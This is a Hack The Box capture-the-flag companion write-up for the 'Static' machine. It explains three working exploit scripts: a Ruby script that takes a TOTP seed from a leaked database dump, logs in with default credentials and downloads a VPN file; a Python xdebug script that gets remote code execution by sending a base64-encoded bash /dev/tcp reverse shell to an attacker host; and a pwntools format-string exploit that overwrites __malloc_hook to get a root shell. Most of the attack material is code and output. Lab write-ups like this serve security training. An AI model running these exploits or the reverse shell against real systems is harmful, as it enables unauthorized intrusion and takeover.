# Hack The Box. Machines. Static

Machine write-up: https://7rocky.github.io/en/htb/static

### `get_vpn.rb`

This Ruby script is used to automate the process of downloading a `.ovpn` file from the web server at Static machine.

First of all, we need to download a GZIP file called `db.sql.gz`:

```ruby
sql_file = 'db.sql'
gz_file = "#{sql_file}.gz"
tmp = "tmp_#{gz_file}"
host = '10.10.10.246:8080'

puts "[*] Downloading corrupted #{gz_file} file"

url = URI("http://#{host}/.ftp_uploads/#{gz_file}")
res = Net::HTTP.get(url)
File.binwrite(gz_file, res)
```

This file is corrupted because was uploaded using FTP in ASCII mode instead of binary mode. To patch it, we need to replace all ocurrences of `\r\n` by `\n`:

```ruby
File.open(gz_file, 'rb') { |f| File.binwrite(tmp, f.read.gsub("\r\n", "\n")) }
```

Now we can decompress the GZIP file and obtain some SQL contents. Here we can obtain a TOTP key used to handle 2FA (using a regular expression):

```ruby
totp = ''

Zlib::GzipReader.open(tmp) do |f|
  sql = f.read.strip
  puts "[+] Patched #{gz_file} file. Found #{sql_file}:\n\n#{sql}"

  File.open(sql_file, 'w') { |ff| ff.write(sql) }

  totp = sql.scan(/'(.*?)'/).last.first
  puts "\n[+] Using TOTP key: #{totp}"
end

File.delete(tmp)
```

Having this, we can login to the web portal to download the VPN file. Credentials are weak (`admin:admin`):

```ruby
url = URI("http://#{host}/vpn/login.php")
res = Net::HTTP.post(url, 'username=admin&password=admin&submit=Login')
cookie = res['Set-Cookie']
puts '[+] Login successful'
```

To get a valid code for 2FA using TOTP, we need to put the current time of the web server. This time is present in the Date HTTP response header. And then we get the TOTP code using `rotp` library:

```ruby
server_time = Time.parse(res['Date']).to_i
code = ROTP::TOTP.new(totp).at(server_time)
puts "[*] Generating TOTP code: #{code}"
```

And then we enter the code in the web server. It will send a redirect to the portal (URL inside the Location header):

```ruby
res = Net::HTTP.post(url, "code=#{code}", { Cookie: cookie })
location = res['Location']
```

Notice that we need to enter the same cookie as the previous request to maintain the same session with the server.

And finally, we can download the VPN as `static.ovpn`:

```ruby
puts "[+] 2FA successful. Go to http://#{host}/vpn/#{location}"
puts "[+] Cookie: #{cookie}"
puts '[*] Downloading OVPN file...'

url = URI("http://#{host}/vpn/#{location}")
res = Net::HTTP.post(url, 'cn=static', { Cookie: cookie })

File.open(ovpn_file, 'w') { |f| f.write(res.body) }

puts "[+] Downloaded OVPN file: #{ovpn_file}"
```

If we execute the script, we will get the VPN file:

```console
$ ruby get_vpn.rb
[*] Downloading corrupted db.sql.gz file
[+] Patched db.sql.gz file. Found db.sql:

CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) );
INSERT INTO users ( id, username, password, totp ) VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' );

[+] Using TOTP key: orxxi4c7orxwwzlo
[+] Login successful
[*] Generating TOTP code: 508175
[+] 2FA successful. Go to http://10.10.10.246:8080/vpn/panel.php
[+] Cookie: PHPSESSID=1l5prlovq3bek3488ehmi03koj; path=/
[*] Downloading OVPN file...
[+] Downloaded OVPN file: static.ovpn
```

### `xdebug_shell.py`

This Python script is used to gain Remote Code Execution (RCE) into a PHP web server that has `xdebug` enabled. The script is based on https://github.com/gteissier/xdebug-shell. The script inside this repository works, but is made in Python version 2 and provides a custom interactive web shell.

I decided to translate the script to Python version 3 and modify it to obtain a reverse shell connection using `nc`.

The scripts generates the reverse shell payload as follows:

```python
rev_shell = b64e(f'bash  -i >& /dev/tcp/{lhost}/{lport} 0>&1'.encode())
command = f'echo {rev_shell.decode()} | base64 -d | bash'
php_command = b64e(f'shell_exec({pipes.quote(command)})'.encode())
```

Then, we start the `xdebug` session listening on port 9000:

```python
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind(('0.0.0.0', 9000))
    s.listen(1)

    threading.Thread(target=start_xdebug, args=(url, lhost)).start()
```

The function `start_xdebug` is the following. To start the `xdebug` session it only needs a random identifier and the IP address of the host that will be debugging (`lhost`):

```python
def start_xdebug(url, lhost):
    try:
        requests.get(url, timeout=2,
                     params={'XDEBUG_SESSION_START': os.urandom(8).hex()},
                     headers={'X-Forwarded-For': lhost})
    except requests.exceptions.ReadTimeout:
        pass
```

Then, we handle the socket connection and send the reverse shell payload:

```python
conn, _ = s.accept()
conn.recv(1024)
conn.sendall(f'eval -i 1 -- {php_command.decode()}\0'.encode())
conn.close()
```

And we will obtain the connection using `nc`.

Here is an example of the script execution:

```console
$ python3 xdebug_shell.py http://172.20.0.10/info.php 172.30.0.9 4444
```

```console
$ nc -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.30.0.1.
Ncat: Connection from 172.30.0.1:55308.
bash: cannot set terminal process group (37): Inappropriate ioctl for device
bash: no job control in this shell
www-data@web:/var/www/html$
```

### `exploit.py`

This Python exploit is used to gain Remote Code Execution (RCE) over a machine that can execute a binary called `ersatool` that has a Format String vulnerability:

```console
www-data@pki:~/html/uploads$ ersatool
batch mode: /usr/bin/ersatool create|print|revoke CN
www-data@pki:~/html/uploads$ ersatool print %x
ff35015f[!] ERR reading /opt/easyrsa/clients/%x.ovpn!
www-data@pki:~/html/uploads$ ersatool
# print
print->CN=%x
ffe4827f[!] ERR reading /opt/easyrsa/clients/%x.ovpn!
^C
```

The values `ff35015f` and `ffe4827f` are just values from the stack, we are leaking memory data.

Notice that the program can be used in interactive mode.

The exploiting process makes use of `pwntools` library (`pip3 install pwntools`), which provides a lot of useful functionality to make the exploitation easier.

The exploitation will be done through `127.0.0.1:1234` which is forwarded to the target machine (`192.168.254.3:1234`) using SSH port forwarding and `socat`. Read the machine [write-up](https://7rocky.github.io/en/htb/static) to understand the network setup.

This is the basic information about the binary:

```console
$ file ersatool
ersatool: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=961368a18afcdeccddd1f423353ff104bc09e6ae, not stripped

$ checksec --file ersatool
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

- It is a 64-bit ELF binary.
- It has NX enabled, which means that the stack is non-executable.
- It has PIE enabled, which means that the base address of the proper binary is randomized (ASLR) so that it is reset every time the program restarts (the addresses of the functions are computed as an offset plus the base address).
- Moreover, addresses of functions belonging to Glibc will also suffer from ASLR.

We need to perform the following tasks to get RCE:

1. Find the offset of the format string.
2. Leak an address of a function of the binary using the format string.
3. Compute the binary base address.
4. Leak an address of a function of Glibc using the format string.
5. Compute Glibc base address.
6. Change `__malloc_hook` function to a one gadget shell in Glibc using the format string.
7. Trigger `malloc` by allocating a large amount of memory.

**Task 1**: We can fuzz a little more using Python and check where the `AAAA` before the format strings are:

```console
www-data@pki:~/html/uploads$ ersatool print $(python3 -c 'print("AAAA" + "%x." * 100)')
AAAAf7b2915f.ab89b864.f7b2915f.0.78252e78.da4b5a98.ab89be4d.41414141.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.ab89b830.74706f2f.61737279.73746e65.2e782541.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.[!] ERR reading /opt/easyrsa/clients/AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.!
```

As showm, `41414141` (`AAAA` in hexadecimal ASCII values) is on the eighth position (offset `8`).

**Task 2**: To leak an address we must use format strings like `%x` or `%p` (both will print the hexadecimal value of an address, but the second will prepend `0x`). However, instead of putting a lot of format strings, we can take the position we desire using `%i$p`, where `i` is the position. This time, as it is a 64-bit binary, we need to use `%lx` or `%lp`.

Using this idea, let's build a simple Python script using `pwntools` to dump the first 60 values:

```python
from pwn import *

p = remote('127.0.0.1', 1234)


def get_value(i):
    p.sendlineafter(b'print->CN=', f'%{i}$lp'.encode())
    data = p.recvline()
    data = data[:data.index(b'[!] ERR')]
    print(i, data.decode())
    return int(data.decode(), 16)


p.sendlineafter(b'# ', b'print')

for i in range(1, 61):
    get_value(i)
```

```console
$ python3 exploit.py
[+] Opening connection to 127.0.0.1 on port 1234: Done
1 0x5615109d815f
2 0x7ffdc8e5489a
3 0x5615109d815f
4 0x4a
5 0x696c632f61737279
6 0x1109d41d0
7 (nil)
8 0x706c243825
9 (nil)
...
19 (nil)
20 0x561500000000
21 0x7f4a39c0bf51
22 0x7361652f74706f2f
23 0x696c632f61737279
24 0x3432252f73746e65
25 0x6e70766f2e706c24
26 (nil)
...
33 (nil)
34 0x7f4a00000000
35 0x7f4a39bfd87d
36 (nil)
37 (nil)
38 0x7ffdc8e54940
39 0x5615109d4f83
40 0x7ffdc8e54a28
41 0x100000000
42 0x5615109d5070
43 0xa746e697270
44 (nil)
45 0x100000000
46 0x5615109d5070
47 0x7f4a39ba0b97
48 0x2000000000
49 0x7ffdc8e54a28
50 0x100000000
51 0x5615109d4e5b
52 (nil)
53 0xcc040442782a621f
54 0x5615109d41d0
55 0x7ffdc8e54a20
56 (nil)
57 (nil)
58 0x9fd5b4b24a6a621f
59 0x9eba560cce54621f
60 0x7ffd00000000
```

Bypassing ASLR is relatively simple, since the randomized base address always ends on three hexadecimal zeros. Hence, if we know the last three hexadecimal digits of an offset, we can easily identify the real address.

Let's take the offset of the `main` function:

```console
$ readelf -s ersatool | grep ' main'
    86: 0000000000001e5b   524 FUNC    GLOBAL DEFAULT   14 main
```

If we have a look at the values above, we discover that position 51 is `0x5615109d4e5b`, it ends with `e5b`. Then, we have found a way to leak the real address of `main` using `%51$lp` as a format string:

```python
main_addr = get_value(51)
print('Address of main():', hex(main_addr))
```

**Task 3**: The base address of the binary is likely to be `0x5615109d4e5b - 0x1e5b = 0x5615109d3000` (it will be different on every execution of the program):

```python
elf = context.binary = ELF('./ersatool', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

elf.address = main_addr - elf.symbols.main
print('Binary base address:', hex(elf.address))
```

Now the process is kind of standard in Format String exploitation.

**Task 4**: To leak an address of Glibc, we must use the Global Offset Table (GOT). This table is part of the binary and contains the addresses of the functions that can be used by the binary (namely, `printf`, `strncat`, `fgets`...).

The addresses of the GOT are known because we have their offsets and the base address of the binary. We can use the following payload to print the address of `printf` (for example) in Glibc:

```python
leak = b'%9$s'.ljust(8, b'\0') + p64(elf.got.printf)
p.sendlineafter(b'print->CN=', leak)
data = p.recvline()
data = data[:data.index(b'[!] ERR')]

printf_addr = u64(data.ljust(8, b'\0'))
print('Address of printf():', hex(printf_addr))
```

Because strings in C work as pointers, if we put an address of GOT into a format string to print the content of a string, what will be printed is the address pointed by the value of the GOT address.

Notice that we are trying to leak `%9$s`, which will be the data inside address `printf` at GOT, which comes right after the format string (recall that the format string offset is `8`).

If all works correctly, we will have the real address of `printf` in Glibc.

**Task 5**: The base address of Glibc is computed the same way as the binary base address. We only subtract the offset from the real address. Then, we need to verify that the base address ends in `000` hexadecimal digits.

```python
libc.address = printf_addr - libc.symbols.printf
print('Glibc base address:', hex(libc.address))
```

**Task 6**: Now we need to write to an address in memory. The best way to gain code execution in this type of situations is overriding the address of `__malloc_hook` inside Glibc to execute a one gadget shell.

Gadgets are just lines of assembly code that perform a certain operation. They are useful in Buffer Overflow exploitation using Return Oriented Programming (ROP) to bypass NX (also known as DEP).

This time, we can search for a gadget that executes `/bin/sh`. They are commonly found inside Glibc. Using `one_gadget` (`gem install one_gadget`) we can get some potential gadgets:

```console
$ one_gadget libc.so.6
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

We can use `0x4f322`, for example. Now we can easily override `__malloc_hook` using `pwntools` (they provide a magic function called `fmtstr_payload` that does all the work):

```python
one_gadget_shell = libc.address + 0x4f322

payload = fmtstr_payload(
    offset,
    {libc.sym.__malloc_hook: one_gadget_shell},
    write_size='short'
)

p.sendlineafter(b'print->CN=', payload)
p.recv()
```

**Task 7**: The need to override `__malloc_hook` is because now we are going to send `%10000$c`. This task will require some memory space, so the binary will call `malloc`. However, `__malloc_hook` will be executed before. Since it has been modified, instead of calling `malloc`, the program will spawn a shell (`/bin/sh`):

```python
p.sendlineafter(b'print->CN=', b'%10000$c')
p.interactive()
```

If we run the whole exploit, we will gain Remote Code Execution:

```console
$ python3 exploit.py
[+] Opening connection to 127.0.0.1 on port 1234: Done
Offset: 8
51 0x558d4b23fe5b
Address of main(): 0x558d4b23fe5b
Binary base address: 0x558d4b23e000
GOT printf(): 0x558d4b243058
Address of printf(): 0x7f33d1794e80
Glibc base address: 0x7f33d1730000
Address of __malloc_hook(): 0x7f33d1b1bc30
[*] Switching to interactive mode
$ whoami
root
```

**Note:** The previous code snippets are shown only as an explanation, the complete source code is a bit different due to global variables and the imported libraries.
